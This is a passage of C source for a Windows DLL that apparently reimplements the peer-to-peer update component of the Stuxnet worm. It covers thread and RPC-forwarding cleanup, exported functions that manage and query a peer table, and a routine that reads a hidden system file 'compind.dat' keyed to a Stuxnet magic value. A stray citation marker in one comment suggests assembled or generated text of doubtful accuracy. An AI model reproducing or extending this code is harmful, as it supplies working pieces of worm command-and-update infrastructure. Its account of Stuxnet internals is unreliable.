    }

    if (g_hUpdateThread) {
        WaitForSingleObject(g_hUpdateThread, 5000);
        CloseHandle(g_hUpdateThread);
        g_hUpdateThread = NULL;
    }

    if (g_hUpdateStopEvent) {
        CloseHandle(g_hUpdateStopEvent);
        g_hUpdateStopEvent = NULL;
    }

    P2P_StopMailslotWorker();
    RpcForward_Disconnect();

    DeleteCriticalSection(&g_ForwardCtx.csLock);
    P2P_CleanupPeerTable();
}

/*
 * Export 1 - Initialize P2P backup DLL
 */
DWORD WINAPI Export1(VOID)
{
    return P2P_Initialize();
}

/*
 * Export 2 - Cleanup P2P backup DLL
 */
DWORD WINAPI Export2(VOID)
{
    P2P_Cleanup();
    return ERROR_SUCCESS;
}

/*
 * Export 3 - Get peer count
 */
DWORD WINAPI Export3(VOID)
{
    return P2P_GetPeerCount();
}

/*
 * Export 4 - Get peer list
 */
DWORD WINAPI Export4(PDWORD pdwPeerList, PDWORD pdwCount)
{
    DWORD i;

    if (!pdwPeerList || !pdwCount) {
        return ERROR_INVALID_PARAMETER;
    }

    EnterCriticalSection(&g_PeerTable.csLock);

    if (*pdwCount < g_PeerTable.dwCount) {
        LeaveCriticalSection(&g_PeerTable.csLock);
        return ERROR_INSUFFICIENT_BUFFER;
    }

    for (i = 0; i < g_PeerTable.dwCount; i++) {
        pdwPeerList[i] = g_PeerTable.Peers[i].dwIP;
    }

    *pdwCount = g_PeerTable.dwCount;

    LeaveCriticalSection(&g_PeerTable.csLock);

    return ERROR_SUCCESS;
}

/*
 * Export 5 - Get peer latency
 */
DWORD WINAPI Export5(DWORD dwIP, PDWORD pdwLatency)
{
    if (!pdwLatency) {
        return ERROR_INVALID_PARAMETER;
    }

    *pdwLatency = P2P_GetPeerLatency(dwIP);

    return ERROR_SUCCESS;
}

/*
 * Export 6 - Check if peer is known
 */
BOOL WINAPI Export6(DWORD dwIP)
{
    return P2P_IsPeerKnown(dwIP);
}

/*
 * Export 7 - Loads peer-to-peer communication data file [0†L8]
 */
DWORD WINAPI Export7(VOID)
{
    WCHAR szPath[MAX_PATH];
    HANDLE hFile;
    DWORD dwRead;
    PBYTE pData;
    DWORD dwSize;

    GetSystemDirectoryW(szPath, MAX_PATH);
    wcscat_s(szPath, MAX_PATH, L"\\compind.dat");

    hFile = CreateFileW(szPath, GENERIC_READ, FILE_SHARE_READ, NULL,
                        OPEN_EXISTING, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return ERROR_FILE_NOT_FOUND;
    }

    dwSize = GetFileSize(hFile, NULL);
    if (dwSize == 0 || dwSize > RPC_MAX_PAYLOAD) {
        CloseHandle(hFile);
        return ERROR_BAD_LENGTH;
    }

    pData = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
    if (!pData) {
        CloseHandle(hFile);
        return ERROR_NOT_ENOUGH_MEMORY;
    }

    ReadFile(hFile, pData, dwSize, &dwRead, NULL);
    CloseHandle(hFile);

    /* Process peer data from compind.dat */
    if (dwRead >= sizeof(DWORD) && *(PDWORD)pData == STUXNET_MAGIC) {
        DWORD dwPeerCount = *(PDWORD)(pData + 4);
        DWORD* pPeers = (DWORD*)(pData + 8);
        DWORD i;

        for (i = 0; i < dwPeerCount && i < MAX_PEERS; i++) {
            P2P_UpdatePeer(pPeers[i], STUXNET_VERSION, 0);
        }
    }

    HeapFree(GetProcessHeap(), 0, pData);

    return ERROR_SUCCESS;
}

/*
 * DllMain - Entry point
 */
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hinstDLL);
            break;
        case DLL_PROCESS_DETACH:
            P2P_Cleanup();
            break;
        default:
            break;
    }
    return TRUE;
}